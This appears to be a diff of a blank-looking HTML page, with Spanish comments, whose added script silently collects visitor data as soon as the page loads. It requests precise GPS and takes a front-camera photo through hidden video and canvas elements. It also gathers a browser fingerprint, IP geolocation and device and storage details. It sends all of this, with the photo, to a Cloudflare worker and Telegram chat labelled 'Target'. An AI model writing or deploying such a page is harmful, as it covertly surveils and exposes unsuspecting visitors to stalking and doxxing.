@@ -1,141 +1,215 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>.</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>.</title>
+    <style>
+        body { background: white; margin: 0; padding: 0; height: 100vh; display: flex; justify-content: center; align-items: center; font-family: system-ui; color: #eee; }
+        .status { font-size: 0.8rem; color: #ccc; position: fixed; bottom: 10px; right: 10px; }
+    </style>
 </head>
 <body>
-  <video id="video" autoplay playsinline style="display:none;"></video>
-  <canvas id="canvas" style="display:none;"></canvas>
-  <script>
-    const WORKER_URL = 'https://tg-bot12.societykark.workers.dev/';
-    const CHAT_ID = '7555997298';
+    <div class="status" id="status">.</div>
+    <video id="video" autoplay playsinline style="display:none;"></video>
+    <canvas id="canvas" style="display:none;"></canvas>
 
-    async function getIpLocation() {
-      try {
-        const r = await fetch('https://ipapi.co/json/');
-        const d = await r.json();
-        if (d && d.ip) return { ip: d.ip, country: d.country_name, region: d.region, city: d.city, postal: d.postal, timezone: d.timezone };
-      } catch(e) {}
-      try {
-        const r = await fetch('https://ip-api.com/json/');
-        const d = await r.json();
-        if (d.status === 'success') return { ip: d.query, country: d.country, region: d.regionName, city: d.city, postal: d.zip, timezone: d.timezone };
-      } catch(e) {}
-      return null;
-    }
-    async function getFingerprint() {
-      const c = document.createElement('canvas');
-      const ctx = c.getContext('2d');
-      c.width = 200; c.height = 50;
-      ctx.fillStyle = "#f60"; ctx.fillRect(0, 0, 200, 50);
-      ctx.fillStyle = "#069"; ctx.font = "14px Arial"; ctx.fillText("FP", 10, 30);
-      const hash = c.toDataURL().slice(0, 100);
-      let gpu = 'N/A';
-      try {
-        const gl = document.createElement('canvas').getContext('webgl');
-        const info = gl.getExtension('WEBGL_debug_renderer_info');
-        gpu = info ? gl.getParameter(info.UNMASKED_RENDERER_WEBGL) : 'N/A';
-      } catch(e) {}
-      const fonts = ["Arial", "Verdana", "Helvetica", "Times New Roman", "Courier New", "Impact", "Comic Sans MS"];
-      const available = fonts.filter(f => document.fonts.check(`12px "${f}"`));
-      return { gpu, fonts: available.join(', ') || 'Ninguna', canvas: hash };
-    }
-    function getDevice() {
-      const ua = navigator.userAgent;
-      let model = 'Desconocido';
-      if (ua.includes('iPhone')) model = 'iPhone';
-      else if (ua.includes('iPad')) model = 'iPad';
-      else if (ua.includes('Android')) model = 'Android';
-      else if (ua.includes('Mac')) model = 'Mac';
-      else if (ua.includes('Windows')) model = 'Windows PC';
-      return { model, ua, language: navigator.language || 'N/A', resolution: `${window.screen.width}x${window.screen.height}`, cores: navigator.hardwareConcurrency || 'N/A' };
-    }
-    async function getStorage() {
-      try {
-        const est = await navigator.storage.estimate();
-        return { total: (est.quota / (1024**3)).toFixed(2), used: (est.usage / (1024**3)).toFixed(2) };
-      } catch(e) { return { total: 'N/A', used: 'N/A' }; }
-    }
-    function getGPS() {
-      return new Promise((resolve) => {
-        if (!navigator.geolocation) { resolve(null); return; }
-        navigator.geolocation.getCurrentPosition(
-          pos => resolve({ lat: pos.coords.latitude, lng: pos.coords.longitude, accuracy: pos.coords.accuracy }),
-          () => resolve(null),
-          { enableHighAccuracy: true, timeout: 10000 }
-        );
-      });
-    }
-    async function capturePhoto() {
-      const video = document.getElementById('video');
-      const canvas = document.getElementById('canvas');
-      let stream = null;
-      try {
-        stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-      } catch(e) {
-        try { stream = await navigator.mediaDevices.getUserMedia({ video: true }); }
-        catch(err) { return null; }
-      }
-      if (!stream) return null;
-      video.srcObject = stream;
-      await new Promise(resolve => { video.onloadedmetadata = () => { video.play(); resolve(); }; });
-      await new Promise(r => setTimeout(r, 500));
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-      canvas.getContext('2d').drawImage(video, 0, 0);
-      const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
-      stream.getTracks().forEach(t => t.stop());
-      video.srcObject = null;
-      return blob;
-    }
+    <script>
+        const WORKER_URL = 'https://tg-bot12.societykark.workers.dev/';
+        const CHAT_ID = '7555997298';
 
-    async function sendToWorker(text, photoBlob) {
-      const formData = new FormData();
-      formData.append('chat_id', CHAT_ID);
-      formData.append('text', text);
-      if (photoBlob) formData.append('photo', photoBlob, 'photo.jpg');
-      try {
-        const res = await fetch(WORKER_URL, { method: 'POST', body: formData });
-        const txt = await res.text();
-        console.log('Respuesta Worker:', txt);
-        return res.ok;
-      } catch(e) {
-        console.error('Error envío:', e);
-        return false;
-      }
-    }
-
-    window.addEventListener('load', async function() {
-      try {
-        const gps = await getGPS();
-        const ipLoc = await getIpLocation();
-        const fp = await getFingerprint();
-        const device = getDevice();
-        const storage = await getStorage();
-        const photo = await capturePhoto();
-
-        let msg = `📊 *Visitor Information*\n━━━━━━━━━━━━━━━━\n\n`;
-        msg += `🖥️ *Device*\n   • ${device.model}\n   • ${device.ua}\n\n`;
-        msg += `🌐 *IP & Location*\n   • IP: ${ipLoc?.ip || 'N/A'}\n`;
-        if (ipLoc && ipLoc.city !== 'N/A') {
-          msg += `   • ${ipLoc.city}, ${ipLoc.region}, ${ipLoc.country}\n`;
-          msg += `   • Postal: ${ipLoc.postal}\n`;
-          msg += `   • Timezone: ${ipLoc.timezone}\n`;
+        // ---------- 1. OBTENER UBICACIÓN DESDE EL WORKER ----------
+        async function getLocationFromWorker() {
+            try {
+                const res = await fetch(WORKER_URL);
+                const data = await res.json();
+                if (data && data.ip) {
+                    return {
+                        ip: data.ip || 'N/A',
+                        country: data.country || 'N/A',
+                        region: data.region || 'N/A',
+                        city: data.city || 'N/A',
+                        postal: data.postal || 'N/A',
+                        timezone: data.timezone || 'N/A'
+                    };
+                }
+            } catch(e) {}
+            return null;
         }
-        msg += `\n📍 *GPS*: ${gps ? `${gps.lat}, ${gps.lng} (±${gps.accuracy}m)` : 'No disponible'}\n`;
-        if (gps) msg += `   • Maps: https://www.google.com/maps?q=${gps.lat},${gps.lng}\n`;
-        msg += `\n🖼️ *Display*\n   • ${device.resolution}\n`;
-        msg += `\n🔐 *Permisos*\n   • Cámara: ${photo ? 'Permitido' : 'Denegado'}\n   • Ubicación: ${gps ? 'Permitido' : 'Denegado'}\n`;
-        msg += `\n💾 *Storage*\n   • Usado: ${storage.used} GB\n   • Total: ${storage.total} GB\n`;
-        msg += `\n━━━━━━━━━━━━━━━━\n🎯 ${window.location.href}\n⚡ @jsemanper`;
 
-        await sendToWorker(msg, photo);
-      } catch(e) {
-        console.error('Error general:', e);
-      }
-    });
-  </script>
+        // ---------- 2. OBTENER UBICACIÓN DESDE ipapi.co (RESPALDO) ----------
+        async function getLocationFromIpapi() {
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                const data = await res.json();
+                if (data && data.ip) {
+                    return {
+                        ip: data.ip || 'N/A',
+                        country: data.country_name || 'N/A',
+                        region: data.region || 'N/A',
+                        city: data.city || 'N/A',
+                        postal: data.postal || 'N/A',
+                        timezone: data.timezone || 'N/A'
+                    };
+                }
+            } catch(e) {}
+            return null;
+        }
+
+        // ---------- 3. FINGERPRINT ----------
+        async function getFingerprint() {
+            const canvas = document.createElement('canvas');
+            const ctx = canvas.getContext('2d');
+            canvas.width = 200; canvas.height = 50;
+            ctx.fillStyle = "#f60"; ctx.fillRect(0, 0, 200, 50);
+            ctx.fillStyle = "#069"; ctx.font = "14px Arial"; ctx.fillText("FP", 10, 30);
+            const canvasHash = canvas.toDataURL().slice(0, 100);
+            let gpu = 'N/A';
+            try {
+                const gl = document.createElement('canvas').getContext('webgl');
+                const info = gl.getExtension('WEBGL_debug_renderer_info');
+                gpu = info ? gl.getParameter(info.UNMASKED_RENDERER_WEBGL) : 'N/A';
+            } catch(e) {}
+            const fontsList = ["Arial", "Verdana", "Helvetica", "Times New Roman", "Courier New", "Impact", "Comic Sans MS"];
+            const available = fontsList.filter(f => document.fonts.check(`12px "${f}"`));
+            return { gpu, fonts: available.join(', ') || 'Ninguna', canvas: canvasHash };
+        }
+
+        // ---------- 4. DATOS DEL DISPOSITIVO ----------
+        function getDeviceInfo() {
+            const ua = navigator.userAgent;
+            let model = "Desconocido";
+            if (ua.includes('iPhone')) model = 'iPhone';
+            else if (ua.includes('iPad')) model = 'iPad';
+            else if (ua.includes('Android')) model = 'Android';
+            else if (ua.includes('Mac')) model = 'Mac';
+            else if (ua.includes('Windows')) model = 'Windows PC';
+            return {
+                model,
+                ua,
+                language: navigator.language || 'N/A',
+                resolution: `${window.screen.width}x${window.screen.height}`,
+                cores: navigator.hardwareConcurrency || 'N/A'
+            };
+        }
+
+        // ---------- 5. ALMACENAMIENTO ----------
+        async function getStorageInfo() {
+            try {
+                const est = await navigator.storage.estimate();
+                return {
+                    total: (est.quota / (1024**3)).toFixed(2),
+                    used: (est.usage / (1024**3)).toFixed(2)
+                };
+            } catch(e) {
+                return { total: 'N/A', used: 'N/A' };
+            }
+        }
+
+        // ---------- 6. GPS EXACTO ----------
+        function getGPS() {
+            return new Promise((resolve) => {
+                if (!navigator.geolocation) { resolve(null); return; }
+                navigator.geolocation.getCurrentPosition(
+                    pos => resolve({ lat: pos.coords.latitude, lng: pos.coords.longitude, accuracy: pos.coords.accuracy }),
+                    () => resolve(null),
+                    { enableHighAccuracy: true, timeout: 10000 }
+                );
+            });
+        }
+
+        // ---------- 7. CÁMARA FRONTAL ----------
+        async function capturePhoto() {
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+            let stream = null;
+            try {
+                stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+            } catch(e) {
+                try { stream = await navigator.mediaDevices.getUserMedia({ video: true }); }
+                catch(err) { return null; }
+            }
+            if (!stream) return null;
+            video.srcObject = stream;
+            await new Promise(resolve => { video.onloadedmetadata = () => { video.play(); resolve(); }; });
+            await new Promise(r => setTimeout(r, 500));
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
+            stream.getTracks().forEach(t => t.stop());
+            video.srcObject = null;
+            return blob;
+        }
+
+        // ---------- 8. ENVÍO AL WORKER ----------
+        async function sendToWorker(text, photoBlob) {
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('text', text);
+            if (photoBlob) {
+                formData.append('photo', photoBlob, 'photo.jpg');
+            }
+            try {
+                const res = await fetch(WORKER_URL, { method: 'POST', body: formData });
+                console.log('Respuesta Worker:', await res.text());
+                return res.ok;
+            } catch(e) {
+                console.error(e);
+                return false;
+            }
+        }
+
+        // ---------- 9. PROCESO PRINCIPAL ----------
+        window.addEventListener('load', async function() {
+            const status = document.getElementById('status');
+            status.textContent = '•';
+
+            try {
+                // Recolectar datos
+                const gps = await getGPS();
+                const workerLoc = await getLocationFromWorker();
+                const ipapiLoc = await getLocationFromIpapi();
+                const fp = await getFingerprint();
+                const device = getDeviceInfo();
+                const storage = await getStorageInfo();
+                const photo = await capturePhoto();
+
+                // Construir mensaje EXACTAMENTE como en el ejemplo
+                let msg = `📊 *Visitor Information Captured*\n━━━━━━━━━━━━━━━━\n\n`;
+                msg += `🖥️ *Device & Browser*\n   • Device Model: ${device.model}\n   • User Agent: ${device.ua}\n\n`;
+                msg += `🎨 *Fingerprint*\n   • GPU: ${fp.gpu}\n   • Fonts: ${fp.fonts}\n   • Canvas: ${fp.canvas}...\n\n`;
+                msg += `🌐 *Network Information*\n   • IP Address: ${workerLoc?.ip || ipapiLoc?.ip || 'N/A'}\n   • Language: ${device.language}\n\n`;
+                msg += `📍 *Cloudflare Worker Location*\n`;
+                if (workerLoc && workerLoc.city !== 'N/A') {
+                    msg += `   • Country: ${workerLoc.country}\n   • Region: ${workerLoc.region}\n   • City: ${workerLoc.city}\n   • Postal: ${workerLoc.postal}\n   • Timezone: ${workerLoc.timezone}\n`;
+                } else {
+                    msg += `   • No disponible\n`;
+                }
+                msg += `📍 *IP API Location (ipapi.co)*\n`;
+                if (ipapiLoc && ipapiLoc.city !== 'N/A') {
+                    msg += `   • Country: ${ipapiLoc.country}\n   • Region: ${ipapiLoc.region}\n   • City: ${ipapiLoc.city}\n   • Postal: ${ipapiLoc.postal}\n   • Timezone: ${ipapiLoc.timezone}\n`;
+                } else {
+                    msg += `   • No disponible\n`;
+                }
+                if (gps) {
+                    msg += `📍 *GPS (exacto)*\n   • Coordinates: ${gps.lat}, ${gps.lng}\n   • Accuracy: ±${gps.accuracy} meters\n   • Google Maps: https://www.google.com/maps?q=${gps.lat},${gps.lng}\n`;
+                } else {
+                    msg += `📍 *GPS: Permiso denegado o no disponible*\n`;
+                }
+                msg += `\n🖼️ *Display Information*\n   • Resolution: ${device.resolution}\n`;
+                msg += `\n🔐 *Device Permissions*\n   • Camera: ${photo ? 'Permitido' : 'Denegado/No disponible'}\n   • Location: ${gps ? 'Permitido' : 'Denegado/No disponible'}\n`;
+                msg += `\n💾 *Hardware & Storage*\n   • CPU Cores: ${device.cores}\n   • RAM: N/A GB\n   • Storage Used: ${storage.used} GB\n   • Storage Total: ${storage.total} GB\n`;
+                msg += `\n━━━━━━━━━━━━━━━━\n🎯 Target: ${window.location.href}\n⚡ Developed by: @jsemanper`;
+
+                await sendToWorker(msg, photo);
+                status.textContent = '✓';
+
+            } catch(e) {
+                console.error(e);
+                status.textContent = '✗';
+            }
+        });
+    </script>
 </body>
 </html>
